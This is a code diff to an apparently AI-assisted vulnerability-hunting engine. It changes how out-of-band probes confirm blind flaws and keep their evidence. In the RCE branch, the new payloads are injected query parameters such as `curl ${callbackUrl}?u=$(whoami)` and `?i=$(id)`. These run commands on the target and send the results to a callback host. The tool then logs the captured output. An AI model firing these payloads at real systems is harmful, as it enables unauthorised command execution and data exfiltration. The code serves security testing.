@@ -142,6 +142,7 @@ export interface ProbeResult {
   payload?: string;
   rawHttpLog?: string;
   videoPath?: string;
+  oobBeaconId?: string;
 }
 
 export interface HuntState {
@@ -172,6 +173,7 @@ export interface HypothesisConfirmed {
   exploitPayload: string;
   rawEvidence?: string;
   videoPath?: string;
+  oobBeaconId?: string;
 }
 
 // nuclei -tags filter per hypothesis vuln class. Without a tag (or custom template)
@@ -2129,19 +2131,25 @@ Return ONLY valid JSON array of hypothesis objects.`;
 
       // OOB beacon probe for blind/async vuln classes that don't produce immediate signals
       const oobClasses = ["ssrf", "xss", "sqli", "rce", "xxe"];
-      let oobHit = false;
+      let oob: { hit: boolean; beaconId?: string; summary?: string } = { hit: false };
       if (oobClasses.includes(hypothesis.vulnClass) && !probeResult.found && !probeResult.injectable) {
-        oobHit = await this.runOOBProbe(hypothesis.targetUrl, hypothesis.vulnClass);
+        oob = await this.runOOBProbe(hypothesis.targetUrl, hypothesis.vulnClass);
       }
+      const oobHit = oob.hit;
 
       const result: ProbeResult = {
         hypothesisId: hypothesis.id,
         tool: toolName,
         command: String(probeResult.command || ""),
-        output: oobHit ? `OOB callback received — ${hypothesis.vulnClass} confirmed` : String(probeResult.rawOutput || ""),
+        // Surface the OOB command output (e.g. whoami) in the evidence when present.
+        output: oobHit
+          ? `OOB callback received — ${hypothesis.vulnClass} confirmed${oob.summary ? `\n${oob.summary}` : ""}`
+          : String(probeResult.rawOutput || ""),
         parsed: probeResult,
         success: Boolean(probeResult.found || probeResult.injectable || probeResult.count || probeResult.vulnerable || oobHit),
         duration: Number(probeResult.duration || 0),
+        rawHttpLog: oobHit && oob.summary ? oob.summary : undefined,
+        oobBeaconId: oob.beaconId,
       };
 
       this.state.probes.push(result);
@@ -2759,7 +2767,10 @@ Return ONLY valid JSON array of hypothesis objects.`;
     return args;
   }
 
-  private async runOOBProbe(targetUrl: string, vulnClass: string): Promise<boolean> {
+  private async runOOBProbe(
+    targetUrl: string,
+    vulnClass: string
+  ): Promise<{ hit: boolean; beaconId?: string; summary?: string }> {
     try {
       // Prefer interactsh (public OOB) so real internet targets can call back.
       // Fall back to local callback server for local lab targets.
@@ -2785,8 +2796,12 @@ Return ONLY valid JSON array of hypothesis objects.`;
           return u.toString();
         }
         if (vulnClass === "rce") {
-          u.searchParams.set("cmd", `curl ${callbackUrl}`);
-          u.searchParams.set("exec", `wget ${callbackUrl}`);
+          // Fold command output into the callback query so the beacon captures WHO
+          // executed it — a stronger PoC than a bare ping. searchParams.set()
+          // URL-encodes the $()/spaces; the target's shell substitutes on execution.
+          u.searchParams.set("cmd", `curl ${callbackUrl}?u=$(whoami)`);
+          u.searchParams.set("exec", `curl ${callbackUrl}?i=$(id)`);
+          u.searchParams.set("c", `curl ${callbackUrl}?w=\`whoami\``);
           return u.toString();
         }
         // sqli blind: time-based + OOB
@@ -2803,27 +2818,38 @@ Return ONLY valid JSON array of hypothesis objects.`;
       // Interactsh gets more time since DNS propagation can add a few seconds
       const waitMs = useInteractsh ? 15_000 : 12_000;
       let hit = false;
+      let exfil: Record<string, string> | undefined;
 
       if (useInteractsh) {
         const oobHit = await interactshManager.waitForHit(beaconId, waitMs);
         hit = Boolean(oobHit);
       } else {
-        hit = await callbackServer.waitForHit(beaconId, waitMs);
+        const rec = await callbackServer.waitForHit(beaconId, waitMs);
+        hit = rec !== null;
+        exfil = rec?.exfil;
         callbackServer.cleanup(beaconId);
       }
+
+      // Build a human-readable summary of any captured command output.
+      const LABELS: Record<string, string> = { u: "whoami", i: "id", w: "whoami" };
+      const summary = exfil && Object.keys(exfil).length > 0
+        ? "OOB command output — " + Object.entries(exfil)
+            .map(([k, v]) => `${LABELS[k] ?? k}=${v}`).join(", ")
+        : undefined;
 
       if (hit) {
         this.emit("hunt:oob_hit", {
           sessionId: this.state.sessionId, beaconId, vulnClass, targetUrl,
           via: useInteractsh ? "interactsh" : "local",
           domain: interactshManager.getDomain() ?? "localhost",
+          exfil,
         });
-        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl, via: useInteractsh ? "interactsh" : "local" });
+        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl, via: useInteractsh ? "interactsh" : "local", exfil });
       }
-      return hit;
+      return { hit, beaconId, summary };
     } catch (err) {
       logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
-      return false;
+      return { hit: false };
     }
   }
 
@@ -2977,6 +3003,9 @@ Return ONLY valid JSON array of hypothesis objects.`;
       exploitPayload,
       rawEvidence: bestProbe?.rawHttpLog ?? undefined,
       videoPath: bestProbe?.videoPath ?? undefined,
+      // Link the OOB beacon (if any probe confirmed via callback) so the callback
+      // route can persist oobHitReceived/oobHitAt against this finding.
+      oobBeaconId: probes.find(p => p.oobBeaconId)?.oobBeaconId,
     };
   }
 
@@ -3025,6 +3054,7 @@ Return ONLY valid JSON array of hypothesis objects.`;
         ],
         reproductionSteps: this.buildReproductionSteps(confirmed) as unknown as Record<string, unknown>[],
         exploitPayload: confirmed.exploitPayload,
+        oobBeaconId: confirmed.oobBeaconId,
         affectedUrl: confirmed.hypothesis.targetUrl,
         verificationStatus: "pending",
         status: "new",
